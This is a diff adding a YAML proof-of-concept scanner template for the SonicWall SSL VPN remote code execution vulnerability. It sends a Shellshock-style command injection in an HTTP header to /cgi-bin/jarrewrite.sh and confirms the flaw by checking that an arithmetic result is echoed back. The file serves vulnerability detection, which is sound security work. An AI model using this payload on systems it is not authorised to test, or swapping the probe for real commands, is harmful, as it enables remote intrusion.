@@ -1,0 +1,21 @@
+name: poc-yaml-sonicwall-ssl-vpn-rce
+manual: true
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(1140000, 1144800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /cgi-bin/jarrewrite.sh
+            headers:
+                X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
+expression: r0()
+detail:
+    author: sharecast
+    links:
+        - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
